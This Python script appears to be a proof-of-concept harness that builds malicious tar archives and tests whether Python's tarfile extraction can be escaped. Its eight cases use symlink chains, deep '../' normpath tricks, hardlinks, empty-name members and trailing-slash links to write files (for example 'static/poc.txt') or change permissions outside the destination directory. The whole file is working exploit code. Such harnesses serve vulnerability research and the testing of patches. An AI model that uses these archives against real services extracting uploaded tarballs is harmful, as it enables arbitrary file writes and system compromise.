from __future__ import annotations

import argparse
import io
import os
import pathlib
import shutil
import tarfile
import tempfile
from dataclasses import dataclass


@dataclass(frozen=True)
class Member:
    kind: str
    name: str
    target: str | None = None
    content: bytes | None = None
    mode: int = 0o777


def add_member(tf: tarfile.TarFile, member: Member) -> None:
    info = tarfile.TarInfo(member.name)
    info.mode = member.mode
    if member.kind == "dir":
        info.type = tarfile.DIRTYPE
        tf.addfile(info)
        return
    if member.kind == "symlink":
        info.type = tarfile.SYMTYPE
        info.linkname = member.target or ""
        tf.addfile(info)
        return
    if member.kind == "hardlink":
        info.type = tarfile.LNKTYPE
        info.linkname = member.target or ""
        tf.addfile(info)
        return
    if member.kind == "file":
        data = member.content or b""
        info.size = len(data)
        info.mode = member.mode & 0o666
        tf.addfile(info, io.BytesIO(data))
        return
    raise ValueError(f"unknown member kind: {member.kind}")


def build_archive(members: list[Member], mode: str = "w:gz") -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for member in members:
            add_member(tf, member)
    return buf.getvalue()


def inspect_tree(root: pathlib.Path) -> list[str]:
    lines: list[str] = []
    for path in sorted(root.rglob("*")):
        rel = path.relative_to(root)
        if path.is_symlink():
            lines.append(f"symlink {rel} -> {os.readlink(path)}")
        elif path.is_dir():
            lines.append(f"dir {rel}")
        else:
            lines.append(f"file {rel}")
    return lines


def run_extract(members: list[Member], open_mode: str = "r:*") -> tuple[pathlib.Path, pathlib.Path, Exception | None]:
    data = build_archive(members)
    outer = pathlib.Path(tempfile.mkdtemp(prefix="the-real-target-"))
    dest = outer / "dest"
    error: Exception | None = None
    try:
        with tarfile.open(fileobj=io.BytesIO(data), mode=open_mode) as tf:
            tf.extractall(path=dest)
    except Exception as exc:  # noqa: BLE001
        error = exc
    return outer, dest, error


def case_exfiltration() -> list[Member]:
    return [
        Member("symlink", "escape", target=os.path.join("link", "link", "..", "..", "link-here")),
        Member("symlink", "link", target="./"),
    ]


def case_chmod_outside() -> list[Member]:
    return [
        Member("symlink", "a/pwn", target="."),
        Member("dir", "a/pwn/"),
        Member("symlink", "a/pwn", target="x/../"),
        Member("symlink", "a/x", target="../"),
    ]


def case_simple_static_write() -> list[Member]:
    return [
        Member("symlink", "static", target=os.path.join("..", "..", "app", "static")),
        Member("file", "static/poc.txt", content=b"hello"),
    ]


def case_normpath_symlink() -> list[Member]:
    depth = 32
    deep = "/".join(f"p{i}" for i in range(depth))
    sneaky = "a/" + "../" * depth + "flag"
    return [
        Member("symlink", "a", target=deep),
        Member("symlink", "escape", target=sneaky),
    ]


def case_normpath_hardlink() -> list[Member]:
    depth = 32
    deep = "/".join(f"p{i}" for i in range(depth))
    sneaky = "a/" + "../" * depth + "flag"
    return [
        Member("symlink", "a", target=deep),
        Member("hardlink", "escape", target=sneaky),
    ]


def case_symlink_trailing_slash() -> list[Member]:
    return [
        Member("symlink", "x/", target=".."),
        Member("file", "x/escaped", content=b"hi"),
    ]


def case_link_at_destination() -> list[Member]:
    return [
        Member("symlink", "", target="."),
        Member("file", "tmp/flag.txt", content=b"hi"),
    ]


def case_empty_name_symlink_chain() -> list[Member]:
    return [
        Member("symlink", "", target=""),
        Member("symlink", "a/", target=".."),
        Member("symlink", "", target="dummy"),
        Member("symlink", "", target="a"),
        Member("symlink", "b/", target=".."),
        Member("symlink", "", target="dummy"),
        Member("symlink", "", target="a/b"),
        Member("file", "escaped", content=b"hi"),
    ]


CASES = {
    "exfiltration": case_exfiltration,
    "chmod_outside": case_chmod_outside,
    "simple_static_write": case_simple_static_write,
    "normpath_symlink": case_normpath_symlink,
    "normpath_hardlink": case_normpath_hardlink,
    "symlink_trailing_slash": case_symlink_trailing_slash,
    "link_at_destination": case_link_at_destination,
    "empty_name_symlink_chain": case_empty_name_symlink_chain,
}


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("case", choices=sorted(CASES))
    parser.add_argument("--keep", action="store_true")
    parser.add_argument("--write", type=pathlib.Path)
    args = parser.parse_args()

    members = CASES[args.case]()
    data = build_archive(members)
    if args.write:
        args.write.write_bytes(data)
    outer, _dest, error = run_extract(members)
    print(f"outer={outer}")
    print(f"archive_bytes={len(data)}")
    if error is None:
        print("extract=OK")
    else:
        print(f"extract={type(error).__name__}: {error}")
    for line in inspect_tree(outer):
        print(line)
    if not args.keep:
        shutil.rmtree(outer, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
